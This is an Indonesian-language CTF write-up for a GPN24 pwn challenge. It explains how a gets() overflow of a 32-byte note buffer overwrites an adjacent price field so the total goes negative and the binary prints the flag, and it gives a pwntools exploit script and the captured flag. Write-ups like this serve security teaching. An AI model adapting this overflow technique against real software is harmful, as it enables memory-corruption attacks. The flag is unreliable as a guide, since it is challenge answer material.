Kerentanan utama terletak pada fungsi take_order() di dalam file challenge.c. Program menggunakan fungsi gets() yang tidak aman untuk menerima input dari pengguna ke dalam buffer note.

printf("Any note for the chef? (leave blank for none)\n> ");
gets(cur->note); // <-- Vulnerability


Buffer note didefinisikan dalam struct Item sebagai array karakter berukuran 32 byte. Tepat setelah note di dalam memori struct tersebut, terdapat variabel price bertipe integer (4 byte).

typedef struct {
  char item[32];
  char note[32]; // 32 bytes
  int price;     // 4 bytes
} Item;


Karena gets() tidak membatasi jumlah input yang dibaca, kita dapat menulis lebih dari 32 byte ke dalam note, yang mengakibatkan memori tumpah (overflow) dan menimpa nilai variabel price di sebelahnya.

Strategi Eksploitasi

Tujuan eksploitasi adalah memicu pemanggilan fungsi print_coupon() yang akan membaca dan mencetak isi file /flag. Fungsi ini dipanggil dari dalam verify_total() jika argumen total bernilai kurang dari 0.

void verify_total(int total) {
  if (total < 0) {
    puts("\n[SYSTEM] Pricing error detected! We sincerely apologise for");
    puts("[SYSTEM] the inconvenience. Please accept this coupon:\n");
    print_coupon();
    exit(0);
  }
  // ...
}


Agar nilai total menjadi negatif, kita mengeksploitasi buffer overflow pada fungsi gets().

Kirim 32 byte junk data (misal: A * 32) untuk memenuhi buffer note.

Kirim 4 byte nilai integer negatif (misal: 0xffffffff yang merupakan representasi -1 dalam memori 32-bit).

Selesaikan pesanan agar program menghitung kalkulasi total.

Total pesanan akan menjadi negatif, memicu verify_total() untuk mencetak flag.

Script Eksploitasi (pwntools)

from pwn import *

# Konfigurasi target
host = 'boiled-strawberry-marinated-in-whipped-carbonara-feyg.gpn24.ctf.kitctf.de'
port = 443

# Koneksi via SSL
p = remote(host, port, ssl=True)

# Memilih menu item pertama
p.sendlineafter(b'finish: ', b'1')

# Payload: 32 bytes padding + 4 bytes integer -1
payload = b'A' * 32 + p32(0xffffffff)
p.sendlineafter(b'> ', payload)

# Mengirim '0' untuk menyelesaikan pesanan dan memicu kalkulasi total
p.sendlineafter(b'finish: ', b'0')

# Menangkap output flag
p.interactive()


Hasil

Eksekusi script menghasilkan total harga negatif dan memicu sistem untuk mencetak flag:

Flag: GPNCTF{WA1t, wiTh THe5e PriCe5, OverflOws ShOUld n0T 8E po5Sible...}
